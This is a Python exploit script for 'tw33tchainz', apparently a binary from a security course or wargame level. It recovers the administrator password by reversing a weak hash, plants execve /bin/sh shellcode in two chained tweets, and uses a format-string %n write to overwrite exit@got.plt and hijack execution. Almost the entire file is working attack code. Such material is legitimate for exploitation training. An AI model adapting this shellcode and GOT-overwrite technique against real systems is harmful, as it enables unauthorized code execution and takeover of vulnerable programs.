#! /usr/bin/env python

import struct
from binascii import hexlify
from subprocess import Popen, PIPE
import re

USERNAME = "tdaddy"
SALT = "poopsmith"

EXIT_GOT_PLT_L = '\x3c\xd0\x04\x08'
EXIT_GOT_PLT_H = '\x3e\xd0\x04\x08'

ADDR1_MATCH = r'Address: 0x(........)'
ADDR2_MATCH = r'Next: 0x(........)'

SHELLCODE_CHUNK2 = '\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\xB0\x0B\x89\xE3\xCD\x80'
SHELLCODE_CHUNK1 = '\x31\xC9\xF7\xE1\x51\xbe{}\xff\xe6'

def main():
    proc = Popen('/levels/project1/tw33tchainz', stdin=PIPE, stdout=PIPE, stderr=PIPE)
    raw_input("pid = %d push start" % proc.pid)
    proc.stdin.write(USERNAME + '\n' + SALT + '\n')

    proc.stdout.read(1391) # skip all the bullshit
    hash = proc.stdout.read(32)
    print "Hash: " + hash
    
    proc.stdin.write('\n') # spawn the menu

    print "[+] Recovering secretpass..."
    secretpass = retrieve_secret(USERNAME, SALT, hash)
    
    print "[+] Authenticating as administrator..."
    proc.stdin.write('3\n') # go to the admin menu
    proc.stdin.write(secretpass + '\n') # send password
        
    print "[+] Enable debug mode..."
    proc.stdin.write('6\n\n') # turn on debug mode
    
    # build shellcode tweets
    proc.stdin.write('1\n' + SHELLCODE_CHUNK2 + '\n\n') # write 2nd half first
    
    proc.stdout.read(6874) # clear out the rest of the shit...this is so bad
    proc.stdin.write('2\n') # view tweets to get 1st link address

    viewtweets = proc.stdout.read(134)
    node1_addr = re.match(ADDR1_MATCH, viewtweets).groups()[0].decode('hex')[::-1]
#    node1_addr = "\x01\x01\x01\x01"
    proc.stdin.write('\n')

    proc.stdin.write('1\n' + SHELLCODE_CHUNK1.format(node1_addr) + '\xcc' * 4 + '\n\n') # then write first chunk w/ jmp

    proc.stdout.read(3513) # clear out the rest of the shit...this is so bad
    proc.stdin.write('2\n') # view tweets to get 1st link address
    proc.stdout.read(20)
    viewtweets = proc.stdout.read(134)
    node2_addr = re.match(ADDR2_MATCH, viewtweets).groups()[0]

    proc.stdin.write('\n')

    inode2_addr = int(node2_addr, 16)
    inode2_addr_l = inode2_addr & 0x0000ffff
    inode2_addr_h = inode2_addr >> 16
    print inode2_addr_l - 5
    print inode2_addr_h - 5

    
    print "[+] Triggering overwriting exit@got.plt..."
    proc.stdin.write('1\nC'+ EXIT_GOT_PLT_L + '%{}x%8$n\n\n'.format(inode2_addr_l - 5)) # tweet with fmt string to overwrite exit@got.plt
    proc.stdin.write('1\nB'+ EXIT_GOT_PLT_H + '%{}x%8$n\n\n'.format(inode2_addr_h - 5)) # tweet with fmt string to overwrite exit@got.plt
    # menu prints here, which actually runs the exploit

    print "[+] Triggering the exploit ( quit => exit() )..."
    proc.stdin.write('5\n\n') # call exit@got.plt ==> we now control EIP

    proc.communicate('touch /tmp/tdaddy/JUSTIN.txt\n')

#    proc.terminate()

    for b in proc.stdout:   # and print all the output we've ignored
        #print b,
        pass

def retrieve_secret(user, salt, hash):
    user = user + '\n\0' # simulate some of the fgets fuckery
    salt = salt + '\n\0'
    user = user + '\xcc' * (16 - len(user) + 1) # add padding that hash() uses
    salt = salt + '\xba' * (16 - len(salt) + 1)
    user = user[:16] # make sure we're only keep the right number of chars
    salt = salt[:16]

    hash_arr = bytearray.fromhex(hash)

    # fix the byte order to simplify the loop
    fixed_hash = hash_arr[0:4][::-1] + hash_arr[4:8][::-1] + hash_arr[8:12][::-1] + hash_arr[12:][::-1]

    secret = bytearray(16)

    for i in range(0, 16):
        tmp = (fixed_hash[i] ^ ord(user[i])) - ord(salt[i])
        tmp &= 0xFF
        secret[i] = tmp
        
    print 'Recovered secretpass: {}.{}.{}.{}'.format(hexlify(secret[:4][::-1]), hexlify(secret[4:8][::-1]), hexlify(secret[8:12][::-1]), hexlify(secret[12:][::-1]))    
    return secret

if __name__ == "__main__":
    main()
